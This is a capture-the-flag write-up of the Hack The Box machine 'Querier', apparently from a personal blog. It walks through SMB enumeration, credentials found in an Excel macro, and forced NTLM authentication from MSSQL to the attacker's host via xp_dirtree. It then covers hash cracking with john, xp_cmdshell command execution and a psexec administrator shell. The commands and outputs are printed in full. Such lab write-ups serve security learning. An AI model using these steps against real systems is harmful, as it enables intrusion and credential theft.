---
layout: post
title:  "HTB Querier"
date:  2020-08-14 21:00:00 +0930
tags: [HTB][Write-Up]
---
Old Hack The Back write up.

![](https://raw.githubusercontent.com/FinalSynapse/FinalSynapse.github.io/master/images/HTB_Querier/Querier.PNG)



***

## Enumeration

So I stated of with a standard nmap scan:
{% highlight bash %}
# Nmap 7.70 scan initiated Sat Jun 22 01:57:59 2019 as: nmap -sC -sV -oN nmap 10.10.10.125
Nmap scan report for 10.10.10.125
Host is up (0.38s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-06-21T23:50:55
|_Not valid after:  2049-06-21T23:50:55
|_ssl-date: 2019-06-21T23:58:48+00:00; -1h00m00s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m00s, deviation: 0s, median: -1h00m00s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-06-22 00:58:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 22 01:58:58 2019 -- 1 IP address (1 host up) scanned in 59.13 seconds
{% endhighlight %}

Immediately I can see an SMB share so let's enumerate that.

{% highlight bash %}
$smbmap -u anonymous -H 10.10.10.125 -R
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.125...
[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	.\
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	-r--r--r--                4 Sun Dec 31 23:58:45 1600	lsass
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-33c-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-1cc-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-3c4-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-364-0
	-r--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-254-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	spoolss
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-7d4-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	trkwks
	-r--r--r--                4 Sun Dec 31 23:58:45 1600	srvsvc
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	vgauth-service
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-654-0
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	ROUTER
	-r--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	-r--r--r--                6 Sun Dec 31 23:58:45 1600	SQLLocal\MSSQLSERVER
	-r--r--r--                2 Sun Dec 31 23:58:45 1600	sql\query
	-r--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-24c-0
	Reports                                           	READ ONLY
	.\
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	.
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	..
	-r--r--r--            12229 Mon Jan 28 23:26:31 2019	Currency Volume Report.xlsm
{% endhighlight %}

What stands out to me is that Currency report, and it's the only thing I can access right now. Let's download and open it.

![](https://raw.githubusercontent.com/FinalSynapse/FinalSynapse.github.io/master/images/HTB_Querier/Q1.PNG)

We get a warning about macros and the document is blank.

![](https://raw.githubusercontent.com/FinalSynapse/FinalSynapse.github.io/master/images/HTB_Querier/Q2.PNG)

Lets have a look at those macros.

![](https://raw.githubusercontent.com/FinalSynapse/FinalSynapse.github.io/master/images/HTB_Querier/Q3.PNG)

And bingo! We have found some credentials.

***

## User

We can confirm this by using MSF's auxiliary module mssql_login

{% highlight bash %}

msf5 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.10.10.125:1433     - 10.10.10.125:1433 - MSSQL - Starting authentication scanner.
[!] 10.10.10.125:1433     - No active DB -- Credential data will not be saved!
[+] 10.10.10.125:1433     - 10.10.10.125:1433 - Login Successful: WORKSTATION\reporting:PcwTWTHRwryjc$c6
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

{% endhighlight %}

Next we use these credentials to get NTLM hashes out of the server.

{% highlight bash %}
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > show options

Module options (auxiliary/admin/mssql/mssql_ntlm_stealer):

   Name                 Current Setting   Required  Description
   ----                 ---------------   --------  -----------
   PASSWORD             PcwTWTHRwryjc$c6  no        The password for the specified username
   RHOSTS               10.10.10.125      yes       The target address range or CIDR identifier
   RPORT                1433              yes       The target port (TCP)
   SMBPROXY             10.10.14.49       yes       IP of SMB proxy or sniffer.
   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                 yes       The number of concurrent threads
   USERNAME             reporting         no        The username to authenticate as
   USE_WINDOWS_AUTHENT  true              yes       Use windows authentification (requires DOMAIN option set)

msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > run

[*] 10.10.10.125:1433     - DONT FORGET to run a SMB capture or relay module!
[*] 10.10.10.125:1433     - Forcing SQL Server at 10.10.10.125 to auth to 10.10.14.49 via xp_dirtree...
[+] 10.10.10.125:1433     - Successfully executed xp_dirtree on 10.10.10.125
[+] 10.10.10.125:1433     - Go check your SMB relay or capture module for goodies!
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) >

{% endhighlight %}

Using responder we capture the hashes then use john the ripper to crack them

{% highlight bash %}

$john --wordlist=/home/user/rockyou.txt /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.10.10.125.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
corporate568     (mssql-svc)
2g 0:00:00:06 DONE (2019-06-22 13:12) 0.2894g/s 1296Kp/s 2593Kc/s 2593KC/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

{% endhighlight %}

We now have the mssql-svc password, which we use to login and run commands.

{% highlight bash %}
$python ~/impacket/examples/mssqlclient.py -windows-auth WORKSTATION/mssql-svc:corporate568@10.10.10.125
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> ?

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

SQL> xp_cmdshell "dir c:\users"
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is FE98-F373                                                 

NULL                                                                               

 Directory of c:\users                                                             

NULL                                                                               

01/29/2019  12:41 AM    <DIR>          .                                           

01/29/2019  12:41 AM    <DIR>          ..                                          

01/28/2019  11:17 PM    <DIR>          Administrator                               

01/29/2019  12:42 AM    <DIR>          mssql-svc                                   

01/28/2019  11:17 PM    <DIR>          Public                                      

               0 File(s)              0 bytes                                      

               5 Dir(s)   6,597,021,696 bytes free                                 

NULL                                                                               

{% endhighlight %}

And get the user flag :)

{% highlight bash %}

SQL> xp_cmdshell "dir c:\users\mssql-svc\Desktop"
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is FE98-F373                                                 

NULL                                                                               

 Directory of c:\users\mssql-svc\Desktop                                           

NULL                                                                               

01/29/2019  12:42 AM    <DIR>          .                                           

01/29/2019  12:42 AM    <DIR>          ..                                          

01/28/2019  01:08 AM                33 user.txt                                    

               1 File(s)             33 bytes                                      

               2 Dir(s)   6,597,021,696 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell "more c:\users\mssql-svc\Desktop\user.txt"
output                                                                             

--------------------------------------------------------------------------------   

c37..........................                                                   

NULL                                                                               


{% endhighlight %}


***

## Root

### Umm I lost some notes...

And finally...

{% highlight bash %}
$python ~/impacket/examples/psexec.py 'QUERIER/Administrator':'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file YvXZYqVQ.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service Nygc on 10.10.10.125.....
[*] Starting service Nygc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is FE98-F373

 Directory of c:\Users\Administrator\Desktop

01/29/2019  01:04 AM    <DIR>          .
01/29/2019  01:04 AM    <DIR>          ..
01/28/2019  01:08 AM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)   6,572,769,280 bytes free

c:\Users\Administrator\Desktop>more root.txt
b19..........................

{% endhighlight %}
